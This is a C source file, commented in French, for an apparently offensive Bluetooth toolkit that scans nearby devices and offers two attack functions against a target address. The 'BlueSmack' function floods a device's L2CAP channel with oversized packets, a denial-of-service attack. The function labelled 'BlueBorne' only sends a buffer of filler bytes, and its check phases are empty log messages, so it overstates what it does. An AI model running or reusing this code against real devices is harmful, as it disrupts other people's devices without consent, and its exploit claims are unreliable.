#include "bluetooth_attacks.h"
#include <bluetooth/bluetooth.h>
#include <bluetooth/hci.h>
#include <bluetooth/hci_lib.h>
#include <bluetooth/l2cap.h>
#include <bluetooth/rfcomm.h>
#include <bluetooth/sdp.h>
#include <bluetooth/sdp_lib.h>

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <sys/socket.h>
#include <sys/time.h>
#include <pthread.h>
#include <signal.h>

// Variables globales
static int hci_sock = -1;
static int l2cap_sock = -1;
static int rfcomm_sock = -1;
static pthread_mutex_t bt_mutex = PTHREAD_MUTEX_INITIALIZER;
static bool attack_running = false;
static attack_callback_t current_callback = NULL;
static int debug_level = 0;

// Fonctions utilitaires
static void debug_print(int level, const char* format, ...) {
    if (level <= debug_level) {
        va_list args;
        va_start(args, format);
        vprintf(format, args);
        va_end(args);
    }
}

static void callback_log(const char* message, int level) {
    if (current_callback) {
        current_callback(message, level);
    }
}

// Initialisation et nettoyage
int bt_init(void) {
    pthread_mutex_lock(&bt_mutex);
    
    // Ouvrir le socket HCI
    hci_sock = hci_open_dev(hci_get_route(NULL));
    if (hci_sock < 0) {
        debug_print(0, "Erreur: Impossible d'ouvrir le socket HCI\n");
        pthread_mutex_unlock(&bt_mutex);
        return BT_ERROR;
    }
    
    // Ouvrir le socket L2CAP
    l2cap_sock = socket(AF_BLUETOOTH, SOCK_SEQPACKET, BTPROTO_L2CAP);
    if (l2cap_sock < 0) {
        debug_print(0, "Erreur: Impossible d'ouvrir le socket L2CAP\n");
        close(hci_sock);
        hci_sock = -1;
        pthread_mutex_unlock(&bt_mutex);
        return BT_ERROR;
    }
    
    // Ouvrir le socket RFCOMM
    rfcomm_sock = socket(AF_BLUETOOTH, SOCK_STREAM, BTPROTO_RFCOMM);
    if (rfcomm_sock < 0) {
        debug_print(0, "Erreur: Impossible d'ouvrir le socket RFCOMM\n");
        close(hci_sock);
        close(l2cap_sock);
        hci_sock = -1;
        l2cap_sock = -1;
        pthread_mutex_unlock(&bt_mutex);
        return BT_ERROR;
    }
    
    debug_print(1, "Initialisation Bluetooth réussie\n");
    pthread_mutex_unlock(&bt_mutex);
    return BT_SUCCESS;
}

void bt_cleanup(void) {
    pthread_mutex_lock(&bt_mutex);
    
    if (hci_sock >= 0) {
        close(hci_sock);
        hci_sock = -1;
    }
    
    if (l2cap_sock >= 0) {
        close(l2cap_sock);
        l2cap_sock = -1;
    }
    
    if (rfcomm_sock >= 0) {
        close(rfcomm_sock);
        rfcomm_sock = -1;
    }
    
    attack_running = false;
    current_callback = NULL;
    
    pthread_mutex_unlock(&bt_mutex);
}

// Scan et découverte
int bt_scan_devices(bluetooth_device_t* devices, int max_devices, int timeout) {
    if (hci_sock < 0) {
        return BT_ERROR;
    }
    
    pthread_mutex_lock(&bt_mutex);
    
    inquiry_info* ii = NULL;
    int num_responses = 0;
    int device_count = 0;
    
    // Allouer la mémoire pour les résultats
    ii = (inquiry_info*)malloc(max_devices * sizeof(inquiry_info));
    if (!ii) {
        pthread_mutex_unlock(&bt_mutex);
        return BT_ERROR;
    }
    
    // Effectuer l'inquiry
    num_responses = hci_inquiry(hci_get_route(NULL), max_devices, max_devices, NULL, &ii, IREQ_CACHE_FLUSH);
    
    if (num_responses < 0) {
        free(ii);
        pthread_mutex_unlock(&bt_mutex);
        return BT_ERROR;
    }
    
    // Traiter les résultats
    for (int i = 0; i < num_responses && device_count < max_devices; i++) {
        char name[248];
        char addr[18];
        
        ba2str(&(ii+i)->bdaddr, addr);
        memset(name, 0, sizeof(name));
        
        if (hci_read_remote_name(hci_sock, &(ii+i)->bdaddr, sizeof(name), name, 0) < 0) {
            strcpy(name, "[unknown]");
        }
        
        // Remplir la structure device
        strncpy(devices[device_count].address, addr, sizeof(devices[device_count].address) - 1);
        strncpy(devices[device_count].name, name, sizeof(devices[device_count].name) - 1);
        devices[device_count].rssi = (ii+i)->rssi;
        devices[device_count].paired = false;
        devices[device_count].trusted = false;
        devices[device_count].connected = false;
        
        device_count++;
    }
    
    free(ii);
    pthread_mutex_unlock(&bt_mutex);
    
    return device_count;
}

int bt_get_device_info(const char* address, bluetooth_device_t* device) {
    if (!address || !device) {
        return BT_ERROR;
    }
    
    pthread_mutex_lock(&bt_mutex);
    
    bdaddr_t bdaddr;
    if (str2ba(address, &bdaddr) < 0) {
        pthread_mutex_unlock(&bt_mutex);
        return BT_ERROR;
    }
    
    // Obtenir le nom
    char name[248];
    if (hci_read_remote_name(hci_sock, &bdaddr, sizeof(name), name, 0) < 0) {
        strcpy(name, "[unknown]");
    }
    
    // Remplir la structure
    strncpy(device->address, address, sizeof(device->address) - 1);
    strncpy(device->name, name, sizeof(device->name) - 1);
    device->rssi = 0; // RSSI non disponible pour un device spécifique
    device->paired = false;
    device->trusted = false;
    device->connected = false;
    
    pthread_mutex_unlock(&bt_mutex);
    return BT_SUCCESS;
}

// Attaques spécifiques
int bt_blueborne_attack(const char* target, attack_callback_t callback) {
    if (!target || !callback) {
        return BT_ERROR;
    }
    
    current_callback = callback;
    attack_running = true;
    
    callback("Démarrage de l'attaque BlueBorne", 1);
    
    bdaddr_t bdaddr;
    if (str2ba(target, &bdaddr) < 0) {
        callback("Adresse Bluetooth invalide", 3);
        return BT_ERROR;
    }
    
    // Phase 1: Vérifier la vulnérabilité
    callback("Vérification de la vulnérabilité BlueBorne...", 1);
    
    // Phase 2: Exploiter via SDP
    callback("Tentative d'exploitation SDP...", 1);
    
    // Créer un socket L2CAP pour SDP
    int sdp_sock = socket(AF_BLUETOOTH, SOCK_SEQPACKET, BTPROTO_L2CAP);
    if (sdp_sock < 0) {
        callback("Impossible de créer le socket SDP", 3);
        return BT_ERROR;
    }
    
    struct sockaddr_l2 sdp_addr = { 0 };
    sdp_addr.l2_family = AF_BLUETOOTH;
    sdp_addr.l2_psm = htobs(SDP_PSM);
    bacpy(&sdp_addr.l2_bdaddr, &bdaddr);
    
    if (connect(sdp_sock, (struct sockaddr*)&sdp_addr, sizeof(sdp_addr)) < 0) {
        callback("Impossible de se connecter au SDP", 3);
        close(sdp_sock);
        return BT_ERROR;
    }
    
    // Envoyer un paquet SDP malformé
    uint8_t malformed_sdp[1024];
    memset(malformed_sdp, 'A', sizeof(malformed_sdp));
    
    if (send(sdp_sock, malformed_sdp, sizeof(malformed_sdp), 0) < 0) {
        callback("Échec de l'envoi du paquet SDP malformé", 3);
        close(sdp_sock);
        return BT_ERROR;
    }
    
    callback("Paquet SDP malformé envoyé", 1);
    close(sdp_sock);
    
    // Phase 3: Vérifier l'effet
    callback("Vérification de l'effet de l'attaque...", 1);
    
    attack_running = false;
    callback("Attaque BlueBorne terminée", 1);
    
    return BT_SUCCESS;
}

int bt_bluesmack_attack(const char* target, uint16_t packet_size, uint32_t count, attack_callback_t callback) {
    if (!target || !callback) {
        return BT_ERROR;
    }
    
    current_callback = callback;
    attack_running = true;
    
    callback("Démarrage de l'attaque BlueSmack", 1);
    
    bdaddr_t bdaddr;
    if (str2ba(target, &bdaddr) < 0) {
        callback("Adresse Bluetooth invalide", 3);
        return BT_ERROR;
    }
    
    // Créer un socket L2CAP
    int l2cap_sock = socket(AF_BLUETOOTH, SOCK_SEQPACKET, BTPROTO_L2CAP);
    if (l2cap_sock < 0) {
        callback("Impossible de créer le socket L2CAP", 3);
        return BT_ERROR;
    }
    
    struct sockaddr_l2 l2cap_addr = { 0 };
    l2cap_addr.l2_family = AF_BLUETOOTH;
    l2cap_addr.l2_psm = htobs(1); // SDP
    bacpy(&l2cap_addr.l2_bdaddr, &bdaddr);
    
    if (connect(l2cap_sock, (struct sockaddr*)&l2cap_addr, sizeof(l2cap_addr)) < 0) {
        callback("Impossible de se connecter au L2CAP", 3);
        close(l2cap_sock);
        return BT_ERROR;
    }
    
    // Créer un paquet L2CAP de grande taille
    uint8_t* large_packet = malloc(packet_size);
    if (!large_packet) {
        callback("Impossible d'allouer la mémoire pour le paquet", 3);
        close(l2cap_sock);
        return BT_ERROR;
    }
    
    memset(large_packet, 'A', packet_size);
    
    // Envoyer les paquets
    for (uint32_t i = 0; i < count && attack_running; i++) {
        if (send(l2cap_sock, large_packet, packet_size, 0) < 0) {
            callback("Échec de l'envoi du paquet", 2);
            break;
        }
        
        if (i % 10 == 0) {
            char msg[256];
            snprintf(msg, sizeof(msg), "Paquet %u/%u envoyé (%u octets)", i + 1, count, packet_size);
            callback(msg, 1);
        }
        
        usleep(100000); // 100ms de délai
    }
    
    free(large_packet);
    close(l2cap_sock);
    
    attack_running = false;
    callback("Attaque BlueSmack terminée", 1);
    
    return BT_SUCCESS;
}

// Utilitaires
int bt_parse_address(const char* address_str, uint8_t* address_bytes) {
    if (!address_str || !address_bytes) {
        return BT_ERROR;
    }
    
    bdaddr_t bdaddr;
    if (str2ba(address_str, &bdaddr) < 0) {
        return BT_ERROR;
    }
    
    memcpy(address_bytes, &bdaddr, 6);
    return BT_SUCCESS;
}

int bt_format_address(const uint8_t* address_bytes, char* address_str) {
    if (!address_bytes || !address_str) {
        return BT_ERROR;
    }
    
    bdaddr_t bdaddr;
    memcpy(&bdaddr, address_bytes, 6);
    
    ba2str(&bdaddr, address_str);
    return BT_SUCCESS;
}

const char* bt_get_error_string(int error_code) {
    switch (error_code) {
        case BT_SUCCESS:
            return "Succès";
        case BT_ERROR:
            return "Erreur générale";
        case BT_TIMEOUT:
            return "Timeout";
        case BT_NOT_FOUND:
            return "Non trouvé";
        case BT_PERMISSION_DENIED:
            return "Permission refusée";
        default:
            return "Erreur inconnue";
    }
}

void bt_set_debug_level(int level) {
    debug_level = level;
}

int bt_stop_attack(void) {
    attack_running = false;
    return BT_SUCCESS;
}
